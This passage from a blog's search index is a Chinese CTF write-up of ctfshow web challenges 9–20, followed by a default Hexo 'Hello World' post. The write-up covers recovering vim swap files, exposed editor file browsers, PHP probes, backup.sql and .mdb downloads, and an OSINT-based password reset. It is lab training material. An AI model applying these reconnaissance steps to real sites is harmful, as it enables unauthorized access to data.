id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h3><ul><li>提示：发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</li><li>联想：vim死机？这不留下vim缓存<ul><li><strong>知识点</strong>：vim 交换文件名<br>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容<br>以 index.php 为例：第一次产生的交换文件名为 .index.php.swp<br>再次意外退出后，将会产生名为 .index.php.swo 的交换文件<br>第三次产生的交换文件则为 .index.php.swn</li></ul></li><li>此题访问.index.php.swp下载打开得flag</li></ul><h3 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h3><ul><li>看cookie</li></ul><h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><ul><li><a href="https://zijian.aliyun.com上查一下flag.ctfshow.com/">https://zijian.aliyun.com上查一下flag.ctfshow.com</a></li></ul><h3 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h3><ul><li>提示：有时候网站上的公开信息，就是管理员常用密码</li><li>打开网址（太酷炫，按了5min啥结果没有）</li><li>思考：在哪登陆？试一下login没有 再思考 试一下admin发现找到登陆口</li><li>思考：密码在哪？</li><li>思考提示：最下面找到个数字尝试一下，flag！</li></ul><h3 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h3><ul><li><p>提示：技术文档中不要出现敏感信息，部署到生产环境后及时修改默认密码</p></li><li><p>打开链接，开始闲逛，翻到最底下，技术文档，技术文档，技术文档。。。document？！点开</p></li><li><p>easy</p></li><li><p>点了一下链接，进不去？？？！</p></li><li><p><img src="https://img-blog.csdnimg.cn/8983f88e7e264e92bd52ba5ad94c45e5.png#pic_center" alt="在这里插入图片描述"></p></li><li><p>再看看链接。。。 <strong>your-domain</strong></p></li><li><p>学过英语 dddd</p></li><li><p>拿下</p></li></ul><h3 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h3><ul><li><p>提示：有时候源码里面就不经意间泄漏重要信息（editor）的信息，默认配置害死人</p></li><li><p>dirsearch一下发现&#x2F;editor</p></li><li><p>果断访问一下</p></li><li><p><img src="https://img-blog.csdnimg.cn/42ede35c3e304845887c7801a102507f.png#pic_center" alt="在这里插入图片描述"></p></li><li><p>懵逼1s</p></li><li><p>点提交404（cao，怎么是404）。。。再想想</p></li><li><p>上传图片打开</p></li><li><p><img src="https://img-blog.csdnimg.cn/875fc3b0c3104b95bcafc5c20d718436.png#pic_center" alt="在这里插入图片描述"></p></li><li><p>感觉没什么用啊，崩溃ing</p></li><li><p>随便点一下<strong>图片空间</strong> 哎嗨</p></li><li><p><img src="https://img-blog.csdnimg.cn/57a646bf776f4c17a3af3cd2052aa94f.png#pic_center" alt="在这里插入图片描述"></p></li><li><p>这不就是linux服务器的文件形式吗？想起提示<strong>默认地址</strong></p></li><li><p>&#x2F;var&#x2F;www&#x2F;html&#x2F;nothinghere&#x2F;fl000g.txt</p></li><li><p>找到地址访问得flag！！！</p></li></ul><h3 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h3><ul><li>提示：公开的信息比如邮箱，可能造成信息泄漏，产生严重后果</li><li>打开网页在下面找到一个qq邮箱</li><li>试一下访问&#x2F;admin</li><li>需要密码</li><li>忘记密码</li><li>提示需要问答验证（需要地址）</li><li>qq搜索改qq号发现地址为西安</li><li>输入后重置密码登录获取flag</li></ul><h3 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h3><ul><li><p>看了别人的WP</p></li><li><p><strong>知识点</strong>（查阅可知）：php探针：用来检测空间、服务器运行状况和PHP信息等</p></li><li><p>&#x2F;tz.php访问雅黑PHP探针</p></li><li><p>点击phpinfo</p></li><li><p>ctrl+F搜索ctfshow找到flag</p></li><li><p>长见识了捏</p></li></ul><h3 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h3><ul><li>提示：备份的sql文件会泄漏敏感信息</li><li>dirsearch搜了一遍找不到</li><li>看了wp</li><li>原来是backup.sql</li><li>长点见识</li></ul><h3 id="Web18"><a href="#Web18" class="headerlink" title="Web18"></a>Web18</h3><ul><li><p>打开链接：小鸟游戏（🤯好难，101这是人能到的分数？）</p></li><li><p>估摸是js写的小游戏</p></li><li><p>查看源代码</p></li><li><p><img src="https://img-blog.csdnimg.cn/abb13751e7084b9890488709af0d6c66.png#pic_center" alt="在这里插入图片描述"></p></li><li><p>score&gt;100?嗯？这不是我心心念念的101吗</p></li><li><p><img src="https://img-blog.csdnimg.cn/b1109420a39e443db3a875347249d708.png#pic_center" alt="在这里插入图片描述"></p></li><li><p>编码一下</p></li><li><p>访问110.php</p></li><li><p>flag</p></li></ul><h3 id="Web19"><a href="#Web19" class="headerlink" title="Web19"></a>Web19</h3><ul><li>查看源代码js部分看到username和pazzword</li><li>我这里直接输入框里输过不去</li><li>抓了个包</li><li>得到flag</li></ul><h3 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h3><ul><li>提示：mdb文件是早期asp+access架构的数据库文件，文件泄漏相当于数据库被脱裤了</li><li>盲区 看wp</li><li>访问&#x2F;db&#x2F;db.mdb</li><li>下载文件记事本打开得flag</li></ul>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/07/10/hello-world/"/>
    <url>/2022/07/10/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
